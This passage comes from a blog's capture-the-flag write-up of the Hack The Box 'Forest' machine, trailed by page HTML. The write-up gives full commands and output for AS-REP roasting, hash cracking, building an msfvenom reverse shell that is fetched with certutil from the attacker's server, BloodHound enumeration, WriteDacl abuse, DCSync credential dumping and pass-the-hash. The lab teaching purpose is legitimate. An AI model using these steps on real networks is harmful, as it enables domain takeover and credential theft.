6? How was I missing a username? Inside of impacket’s collection of scripts, there was a file called GetADUsers.py which seemed hopeful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ GetADUsers.py -all htb.local/ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Querying htb.local for information about domain. Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- ------------------- Administrator Administrator@htb.local 2019-09-18 13:09:08.342879 2019-10-07 06:57:07.299606 Guest &lt;never&gt; &lt;never&gt; DefaultAccount &lt;never&gt; &lt;never&gt; krbtgt 2019-09-18 06:53:23.467452 &lt;never&gt; $331000-VK4ADACQNUCA &lt;never&gt; &lt;never&gt; ... sebastien 2019-09-19 20:29:59.544725 2019-09-22 18:29:29.586227 lucinda 2019-09-19 20:44:13.233891 &lt;never&gt; svc-alfresco 2019-11-16 07:54:12.200875 2019-11-16 07:52:19.754834 andy 2019-09-22 18:44:16.291082 &lt;never&gt; mark 2019-09-20 18:57:30.243568 &lt;never&gt; santi 2019-09-20 19:02:55.134828 &lt;never&gt; There it is! The 6th username is svc-alfresco. But I wonder why did the username not appear in our LDAP search results just now? After appending the username to the list of usernames, we performed the ASREPRoast attack again. 1 2 3 4 5 6 7 8 9 10 11 $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set $ cat hashes.asreproast $krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229 Great! We are back on track! We then cracked the hash using john. 1 2 3 4 5 6 7 8 9 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status s3rvice ($krb5asrep$svc-alfresco@HTB.LOCAL) 1g 0:00:00:06 DONE (2019-10-26 03:10) 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed With svc-alfresco:s3rvice, I tried enumerating for SMB shares using smbmap but found nothing :( 1 2 3 4 5 6 7 8 9 10 11 smbmap -H htb.local -u svc-alfresco -p s3rvice [+] Finding open SMB ports.... [+] User SMB session establishd on htb.local... [+] IP: htb.local:445 Name: htb.local Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY NETLOGON READ ONLY SYSVOL READ ONLY With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sS -p 1-65535 htb.local Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 08:40 EST Nmap scan report for htb.local (10.10.10.161) Host is up (0.25s latency). Not shown: 65511 closed ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49698/tcp open unknown 49708/tcp open unknown I now see a possible entry point, which is port 5985 that is used by the WinRM service for remote management of Windows systems. Lets see if we can establish a shell using Alamot’s winrm_shell.rb 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\\svc-alfresco&#39;, password: &#39;s3rvice&#39;, :no_ssl_peer_verification =&gt; true ) ... user.txt 1 2 3 $ ruby winrm_shell.rb PS htb\\svc-alfresco@FOREST Documents&gt; whoami htb\\svc-alfresco We finally got in! Now, to grab the user flag. 1 2 3 PS htb\\svc-alfresco@FOREST Documents&gt; cd ../Desktop PS htb\\svc-alfresco@FOREST Desktop&gt; more user.txt e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) This was where I really got lost and I had to turn to the forums for more hints. Many mentioned about some “dog” but I guess they were referring to BloodHound. 1 2 3 BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment. When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor (SharpHound) to run on the system, I first need to upgrade my current WinRM shell to a meterpreter shell. First, I generate my reverse shell executable using msfvenom and start our reverse shell listener. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:1337 And then start a web server using the builtin SimpleHTTPServer module in python 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/shell.exe . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... In our previous WinRM shell still hopefully connected, 1 2 3 4 5 6 7 PS htb\\svc-alfresco@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\\svc-alfresco@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; Next up, we upload SharpHound.ps1 to the box and run it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 meterpreter &gt; upload SharpHound.ps1 . [*] uploading : SharpHound.ps1 -&gt; . [*] uploaded : SharpHound.ps1 -&gt; .\\SharpHound.ps1 meterpeter &gt; shell Process 2476 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Users\\svc-alfresco\\Documents&gt; powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\Users\\svc-alfresco\\Documents&gt; Import-Module .\\SharpHound.ps1 Import-Module .\\SharpHound.ps1 PS C:\\Users\\svc-alfresco\\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Initializing BloodHound at 8:42 AM on 11/16/2019 Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets Starting Enumeration for htb.local Status: 124 objects enumerated (+124 41.33333/s --- Using 70 MB RAM ) Finished enumeration for htb.local in 00:00:03.7645465 1 hosts failed ping. 0 hosts timedout. Compressing data to C:\\Users\\svc-alfresco\\Documents\\20191116084214_BloodHound.zip. You can upload this file directly to the UI. Finished compressing files! And now to retrieve the compressed file back to our system. 1 2 3 4 5 PS C:\\Users\\svc-alfresco\\Documents&gt; exit C:\\Users\\svc-alfresco\\Documents&gt; exit meterpreter &gt; download 20191116084214_BloodHound.zip [*] downloading : 20191116084214_BloodHound.zip. -&gt; /root/Desktop [*] downloaded : 20191116084214_BloodHound.zip. -&gt; /root/Desktop/20191116084214_BloodHound.zip And now the moment you have been waiting for, witness the capabilities of BloodHound! There are actually 2 ways to run BloodHound, first being running it on your own system and secondly being running it in a Docker container. Since it is extremely troublesome to set up, I will be using this image belane/bloodhound. 1 2 3 4 5 6 $ docker run -it \\ -p 7474:7474 \\ -e DISPLAY=unix$DISPLAY \\ -v /tmp/.X11-unix:/tmp/.X11-unix \\ --device=/dev/dri:/dev/dri \\ --name bloodhound belane/bloodhound What you will notice is that a window will automatically be opened and BloodHound is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. BloodHound actually supports drag and drop but for some reason it was not working so we need to use docker cp to get the data in. 1 $ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip Then from the interface, click on Upload Data on the right side, select the file and hit Open. It will take a while for BloodHound to populate its database. I won’t go through all the features of BloodHound, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently svc-alfresco and are attempting to escalate to the Administrator account, we will set svc-alfresco@htb.local as the Start Node and Administrator@htb.local as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding. As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between EXCHANGE WINDOWS PERMISSION@HTB.LOCAL and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the WriteDacl privilege will be given. 1 The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object&#39;s DACL, you can grant yourself any privilege you want on the object. According to this post, the WriteDacl privilege allows us to perform DCSync operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL. Exploitation First we will need to upload PowerView, which is a module that I use that contains many useful Powershell commands for offensive operations. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; According to this picture from the earlier post, we will need to run ntlmrelayx on our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Protocol Client SMB loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client LDAPS loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMTP loaded.. [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up HTTP Server [*] Servers started, waiting for connections With that done, we need to get the Exchange Server to perform NTLM authentication to us over HTTP. However, there is no Exchange server running on the box! Since we already have a user in the EXCHANGE WINDOWS PERMISSIONS group, we can simply use our own browser to do the authentication. Opening any browser, we browse to http://localhost/privexchange. We will then be prompted for credentials, where we enter those of our newly created user and hit OK. Back on our ntlmrelayx, we see that our new user has gotten the necessary privileges to perform DCSync operations! 1 2 3 4 5 6 7 8 9 10 11 *] HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local [*] HTTPD: Client requested path: /privexchange [*] HTTPD: Client requested path: /privexchange [*] Authenticating against ldap://htb.local as \\rizemon SUCCEED [*] Enumerating relayed user&#39;s privileges. This may take a while on large domains [*] User privileges found: Create user [*] User privileges found: Modifying domain ACL [*] Querying domain security descriptor [*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain [*] Try using DCSync with secretsdump.py and this user :) [*] Saved restore state to aclpwn-20191229-070933.restore And now the last step is to obtain the hash for the domain administrator account using impacket’s secretsdump.py. 1 2 3 4 5 6 7 $ python secretsdump.py &#39;htb.local/rizemon:Password123!@htb.local&#39; -just-dc Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... root.txt (1) Using impacket’s psexec.py and the hashes we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;more C:\\Users\\Administrator\\Desktop\\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt(2) First we will need to upload PowerView, which contains the commands needed for our exploit. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the Remote Management Users group. 1 Add-DomainGroupMember -Identity &quot;Remote Management Users&quot; -Members &#39;rizemon&#39; We then establish a shell using Alamot’s winrm_shell.rb and upgrade to a meterpreter shell. 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\\rizemon&#39;, password: &#39;Password123!&#39;, :no_ssl_peer_verification =&gt; true ) ... 1 2 3 4 5 6 7 8 $ ruby winrm_shell.rb PS htb\\rizemon@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\\rizemon@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; We are going to need PowerView again as well as mimikatz, which is used to dump out the password hashes. 1 2 3 4 5 6 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\\PowerView.ps1 meterpreter &gt; upload /root/Downloads/mimikatz.exe . [*] uploading : /root/Downloads/mimikatz.exe -&gt; . [*] uploaded : /root/Downloads/mimikatz.exe -&gt; .\\mimikatz.exe To dump out the hashes, the new user will need the DCSync privileges, which consist of the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and Replicating Directory Changes In Filtered Set rights. More can be learnt from here. Fortunately, we can use the Add-DomainObjectAcl function to add all 3 privilges for us using the -Rights DCSync option. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 meterpreter &gt; shell Process 1224 created. Channel 2 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Users\\rizemon\\Documents&gt;powershell powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\\Users\\peter1\\Documents&gt;Import-Module ./PowerView.ps1 Import-Module ./PowerView.ps1 PS C:\\Users\\peter1\\Documents&gt; Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync And finally, we dump out the hashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 PS C:\\Users\\rizemon\\Documents&gt; ./mimikatz.exe ./mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator [DC] &#39;htb.local&#39; will be the domain [DC] &#39;FOREST.htb.local&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator User Principal Name : Administrator@htb.local Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000200 ( NORMAL_ACCOUNT ) Account expiration : Password last change : 9/18/2019 9:09:08 AM Object Security ID : S-1-5-21-3072663084-364016917-1341370565-500 Object Relative ID : 500 Credentials: Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6 Using impacket’s psexec.py and the hash we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;more C:\\Users\\Administrator\\Desktop\\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/forest-htb/","@type":"BlogPosting","headline":"Hack The Box - Forest","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-03-22T08:38:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Forest | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Forest</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Forest</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 22, 2020, 8:38 AM +0800" > Mar 22, 2020 <i class="unloaded">2020-03-22T08:38:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3870 words">21 min</span></div></div><div class="post-content"><p>This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience!</p><p><img 